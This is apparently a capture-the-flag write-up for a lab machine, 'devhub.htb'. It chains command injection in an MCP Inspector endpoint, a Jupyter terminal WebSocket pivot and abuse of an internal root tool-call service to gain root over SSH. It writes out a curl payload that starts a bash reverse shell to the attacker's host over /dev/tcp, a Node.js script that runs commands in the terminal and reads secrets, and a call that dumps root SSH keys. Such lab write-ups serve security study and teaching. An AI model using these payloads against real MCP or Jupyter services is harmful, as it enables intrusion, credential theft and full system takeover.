MCP Inspector RCE → Jupyter Terminal Pivot → Internal API Abuse → SSH Key Extraction
01

Summary

This machine involved:

  • Initial Access: RCE via MCP Inspector (port 6274) using command execution
  • User Pivot: Access to Jupyter Notebook as analyst user
  • Privilege Escalation: Abusing internal OPSMCP service (/tools/call) running as root → extracting root SSH key
  • Root: SSH login with extracted private key
02

Phase 1: Reconnaissance

nmap -sC -sV -p- <TARGET_IP>

Open Ports:

  • 22/tcp → OpenSSH
  • 80/tcp → Nginx (DevHub web app)
  • 6274/tcp → MCPJam Inspector (Main attack surface)

Add to hosts:

echo "<TARGET_IP> devhub.htb" | sudo tee -a /etc/hosts
Why this matteredMCP tooling is new enough that a lot of deployments still ship debug/dev interfaces exposed further than intended.
03

Phase 2: Initial Foothold (RCE via MCP Inspector)

The service on port 6274 allowed arbitrary command execution.

1. Start listener:

nc -lvnp 4444

2. Exploit (Command Injection):

curl -X POST http://<TARGET_IP>:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/<kali vpn>/4444 0>&1"],
      "env": {}
    },
    "serverId": "devhub"
  }'

→ Got shell as mcp-dev

Why this matteredAny endpoint whose entire job is "spawn a subprocess with attacker-supplied arguments" needs an allow-list, not just an expectation that callers behave — this pattern shows up across most MCP-adjacent tooling right now.
04

Phase 3: Pivot to Analyst User (User Flag)

From mcp-dev, discovered a Jupyter Lab running on localhost:8888 with a known token. Used WebSocket to interact with the Jupyter Terminal:

cat > /tmp/term_enum.js << 'EOF'
const token = '<jupyter token>';
const ws = new WebSocket(`ws://127.0.0.1:8888/terminals/websocket/flagterm?token=${token}`);

ws.onopen = () => {
  const cmds = ['whoami', 'id', 'cat ~/user.txt', 'cat ~/.opsmcp_key'];
  let delay = 800;
  cmds.forEach(cmd => {
    setTimeout(() => ws.send(JSON.stringify(["stdin", cmd + "\n"])), delay);
    delay += 1500;
  });
};

ws.onmessage = (ev) => console.log(ev.data.toString());
EOF

node /tmp/term_enum.js

User Flag found:

User Flag
Why this matteredA WebSocket terminal is still a terminal — if the token is discoverable, treat it exactly like a shell, including for reading other users' home directories.
05

Phase 4: Privilege Escalation to Root

Key Discovery:

  • Service /opt/opsmcp/server.py running as root
  • API Key: <opsmcp api key>
  • Hidden tool: ops._admin_dump

Dump credentials:

curl -s -H "X-API-Key: <opsmcp api key>" \
  -H "Content-Type: application/json" \
  -X POST http://127.0.0.1:5000/tools/call \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

Extracted Root SSH Private Key → Saved to /tmp/root_key

Why this matteredInternal-only services still need real authorization checks on sensitive tool calls — "only reachable from localhost" is not the same guarantee as "only reachable by root".
06

Phase 5: Get Root Shell

chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@127.0.0.1
